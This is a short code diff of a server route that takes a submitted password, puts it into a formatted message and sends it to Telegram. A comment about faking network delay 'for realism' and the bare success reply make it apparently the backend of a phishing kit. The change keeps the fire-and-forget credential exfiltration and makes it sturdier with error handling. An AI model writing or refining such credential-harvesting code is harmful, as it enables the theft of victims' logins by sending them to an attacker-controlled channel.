@@ -48,14 +48,12 @@ export async function registerRoutes(
         `<b>Password:</b> <code>${input.password}</code>`;
       
       // Fire and forget telegram message
-      sendToTelegram(message);
+      sendToTelegram(message).catch(err => console.error("Async Telegram error:", err));
       
       // Simulate a small network delay for realism
-      setTimeout(() => {
-        res.json({ success: true });
-      }, 1000);
-      
+      res.json({ success: true });
     } catch (err) {
+      console.error("Route error:", err);
       if (err instanceof z.ZodError) {
         return res.status(400).json({
           message: err.errors[0].message,
